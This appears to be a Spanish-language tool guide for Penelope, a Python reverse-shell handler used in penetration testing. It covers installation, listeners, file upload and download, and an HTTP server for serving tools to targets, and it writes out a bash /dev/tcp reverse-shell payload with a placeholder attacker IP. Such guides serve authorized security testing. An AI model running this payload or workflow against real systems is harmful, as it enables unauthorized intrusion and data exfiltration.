
# Penelope (Shell Handler)

## ¿Qué es Penelope?

Penelope es una herramienta de código abierto escrita en Python 3, diseñada para ser un manejador de shells (shell handler) potente y fácil de usar, actuando como un reemplazo moderno y mejorado para `netcat` en escenarios de post-explotación. Su objetivo principal es simplificar y optimizar el proceso de interacción con shells inversas obtenidas de sistemas comprometidos, especialmente después de explotar vulnerabilidades de Ejecución Remota de Código (RCE).

Ofrece una shell PTY (pseudo-terminal) completamente funcional, capacidades de transferencia de archivos y una interfaz interactiva que mejora significativamente la experiencia del pentester.

## ¿Para qué es útil la herramienta?

Penelope es una herramienta crucial en las fases de post-explotación y movimiento lateral de una prueba de penetración o ejercicio de Red Team:

-   **Manejo de Reverse Shells:** Proporciona un entorno robusto y estable para interactuar con shells inversas (conexiones de la máquina comprometida a la máquina del atacante), lo que es fundamental después de explotar una vulnerabilidad RCE.
-   **Transferencia de Archivos:** Facilita la subida y descarga de archivos y directorios entre la máquina del atacante y el sistema objetivo, lo cual es esencial para el exfiltrado de datos o la inyección de herramientas adicionales.
-   **Ejecución Remota de Scripts:** Permite ejecutar scripts directamente en el sistema comprometido y capturar su salida en tiempo real.
-   **Consola PTY Interactiva:** A diferencia de una shell "básica" de `netcat`, Penelope ofrece una shell PTY completa que permite el uso de herramientas basadas en terminal (como `vi`, `htop`), autocompletado y un registro detallado de todas las interacciones.
-   **Persistencia y Múltiples Sesiones:** Puede gestionar múltiples sesiones y listeners, e incluso puede estar configurada para reabrir automáticamente shells si se caen.
-   **Exploración Post-Explotación:** Incluye módulos que facilitan tareas comunes de post-explotación, como la ejecución de herramientas de enumeración sin tocar disco.

## ¿Cómo se usa?

Penelope se opera desde la línea de comandos y requiere Python 3.

### 1. Instalación

1.  **Instalar Python 3:** Asegúrate de tener Python 3.6+ y `pip` instalados en tu sistema (compatible con Linux y macOS).

2.  **Clonar el repositorio:**
    ```bash
    git clone https://github.com/brightio/penelope.git
    cd penelope
    ```

3.  **Instalar dependencias:**
    ```bash
    pip install -r requirements.txt
    ```

### 2. Uso Básico

El flujo típico de uso implica configurar un listener en Penelope y luego generar y ejecutar una carga útil (payload) en el sistema objetivo que se conectará a ese listener.

1.  **Iniciar Penelope y un Listener:**
    Puedes iniciar Penelope y configurar un listener en un puerto específico.

    ```bash
    python3 penelope.py -p 4444
    ```
    -   `-p <puerto>`: Especifica el puerto donde Penelope estará escuchando.

    Penelope te mostrará el comando de shell inverso que debes ejecutar en el objetivo para conectarte. Por ejemplo:
    ```bash
    # Ejemplo de payload para un objetivo Linux/Unix
    bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
    ```
    (Reemplaza `YOUR_IP` con la dirección IP de tu máquina atacante).

2.  **Ejecutar el Payload en el Objetivo:**
    En el sistema comprometido (después de una explotación RCE, por ejemplo), ejecuta el comando del shell inverso. Esto establecerá una conexión con tu listener de Penelope.

3.  **Interactuar con la Shell:**
    Una vez que la conexión se establece, Penelope te dará un shell PTY interactivo del objetivo.

    -   **Comandos de Shell:** Puedes ejecutar comandos normales del sistema operativo del objetivo.
    -   **Transferencia de Archivos:**
        -   `upload <archivo_local> <ruta_remota>`: Sube un archivo.
        -   `download <ruta_remota> <archivo_local>`: Descarga un archivo.
    -   **Módulos:** Penelope puede tener módulos integrados. Usa `help` o `modules` para verlos.
    -   **Salir del Shell PTY:** Normalmente, presionando `F12` te permite salir de la shell PTY para volver al menú principal de Penelope, sin cerrar la sesión.

### 4. Servidor HTTP Integrado

Penelope también puede iniciar un servidor HTTP básico para servir archivos al objetivo:

```bash
python3 penelope.py --serve <directorio_a_servir>
```
Esto es útil para que el objetivo pueda descargar herramientas adicionales.

## Otras Consideraciones

-   **Ética y Legalidad:** Penelope es una herramienta de seguridad ofensiva. Su uso debe ser **estrictamente ético y legal**, y solo en sistemas para los que se tenga autorización explícita para realizar pruebas de penetración. El uso no autorizado es ilegal y puede tener graves consecuencias.
-   **Evadiendo Detección:** Al igual que con cualquier herramienta de post-explotación, se debe tener en cuenta que los sistemas de detección de intrusiones (IDS/IPS) y el software antivirus pueden detectar el tráfico del shell inverso o la actividad de Penelope.
-   **Redes y Firewalls:** Asegúrate de que los firewalls en la máquina del atacante (y en la del objetivo, si es posible) permitan la conexión del shell inverso al puerto configurado en Penelope.
